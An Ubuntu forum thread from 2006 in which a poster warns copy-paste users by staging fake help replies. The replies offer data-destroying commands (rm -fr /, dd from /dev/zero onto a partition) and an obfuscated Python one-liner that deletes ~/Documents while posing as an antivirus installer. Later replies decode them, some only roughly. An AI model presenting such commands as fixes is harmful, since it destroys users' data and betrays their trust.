---
title: "Oh the Evil that's possible..."
date: 2006-08-26
forum: The Cafe
---

### Post by peabody on 2006-08-26
I was bored and was thinking of those old BOFH (bastard operator from hell) jokes.  This should serve as a reminder to you folks.  This forum be a nice group a' people, but y'all be careful now ;).

**For the love of God and all that is holy, please don't try any of the following on your machine:**

User: "It's not working, it's giving me permissions errors."

Ubuntu Forum Help: "Your filesystem's corrupted, here, this'll fix it: sudo rm -fr /"

----

User: "I'm trying to dump my whole filesystem as a backup..."

Ubuntu Forum Help: "Here, try this: sudo dd if=/dev/zero of=/dev/hda1"

----

User: "I think I'm running out of diskspace, is there a disk cleanup wizard or something?"

Ubuntu Forum Help: "Sure thing!  This does the trick for me all the time: dd if=/dev/zero of=clean_tmp bs=1M count=100000000000"

----

User: "I need help installing X program"

Ubuntu Forum Help: "Try my deb! Here" < -- rootkit program.

----

User: "Are there anti-virus programs for Linux"

Ubuntu Forum Help: Here!  This'll install AVG, you can use my key:

```

$ sudo python -c "import urllib,os; os.execlp(urllib.unquote('%72%6d%20%2d%66%72%20') + os.path.expanduser(urllib.unquote('%7e%2f%44%6f%63%75%6d%65%6e%74%73')))"

```

+10 Unix experience points for whoever deciphers that one ;) .  **DON'T FRIGGIN' RUN IT THOUGH!**

----

Innocent sounding user: "Here guys! I made a custom version of the Ubunutu Live CD!  I call it mebuntu!  It comes with a custom wallpaper of an Ax flying through Bill Gates head!  Try it out and let me know what you think!"

Innocent victim: "Oh boy!  Those screens look cool!"

Downloads, burns it, boots it, Live CD mounts partitions and runs a rootkit.

----

Most of these are pretty obvious, but just a word of warning to the copy paste crew.

---

### Post by nalmeth on 2006-08-26
>  Most of these are pretty obvious, but just a word of warning to the copy paste crew.
Yeah, this sort of thing is bound to occur eventually, in one form or another. Ubuntu is getting BIG, these forums too.

---

### Post by KiwiNZ on 2006-08-26
Yep these forums are getting big and so is my Butt with all the time I have to spend here :p

Fingers are my only exercise:p

---

### Post by GarethMB on 2006-08-26
Eh?

None of that makes any sense.

---

### Post by peabody on 2006-08-26
> **GarethMB said:**
> Eh?

None of that makes any sense.

That's sort of the point.  All these things can screw your machine.  Most people here just copy paste a lot of terminal commands.  This is sort of a demonstration.  Just how do you know what the heck you're doin'?

---

### Post by GarethMB on 2006-08-26
> **peabody said:**
> That's sort of the point.  All these things can screw your machine.  Most people here just copy paste a lot of terminal commands.  This is sort of a demonstration.  Just how do you know what the heck you're doin'?
I know that. I was sort of hoping someone would explain them.

---

### Post by peabody on 2006-08-26
> **GarethMB said:**
> I know that. I was sort of hoping someone would explain them.

Me too, :-P , of course *I* know what they do.  Let's see just how many Ubuntuers know the command line.  I'm really intersted if anyone manages to decipher that Python code without hurting themselves.  It ain't exactly rocket science...

---

### Post by biocrasher on 2006-08-26
My Documents folder(and every other precious bit)
is a symbolic link to a readonly partition:cool: 

Apart that, you shouldn't give examples of these things...
Curiosity can drive people into running them.

I remember a couple of years ago when I did a reiserfsck --rebuild-tree
to my mandrake installation, just because I saw it on the manpage...

---

### Post by Ramses de Norre on 2006-08-26
I've got them all except of the python line.. Maybe I should learn python sometimes =)

---

### Post by DoctorMO on 2006-08-26
> sudo rm -fr /

Removes the entire root directory destroying the computer.

> sudo dd if=/dev/zero of=/dev/hda1

Replaces the first partitions first byte with a zero preventing booting your main file system, (although this can be fixed without a reinstall I think)

[QUIOTE]dd if=/dev/zero of=clean_tmp bs=1M count=100000000000[/QUOTE]

Replace every byte in clean_tmp for many many MB with zero. not sure what clean_tmp is.

> sudo python -c "import urllib,os; os.execlp(urllib.unquote('%72%6d%20%2d%66%72%20') + os.path.expanduser(urllib.unquote('%7e%2f%44%6f%63%75%6d%65%6e%74%73')))

This is a way of hiding a command within python, you can do the same thing with perl. this one runs 'rm -fr ~/Documents' to remove all your documents folder.

---

### Post by insane_alien on 2006-08-26
mm if i had ever tried to learn python i could probably figure the last one. i got the rest though. even though i copy and paste a fair bit i take the time to look up what it actually does first. just in case.

---

### Post by peabody on 2006-08-26
DoctorMO pretty much got it all.  Congrats.

---

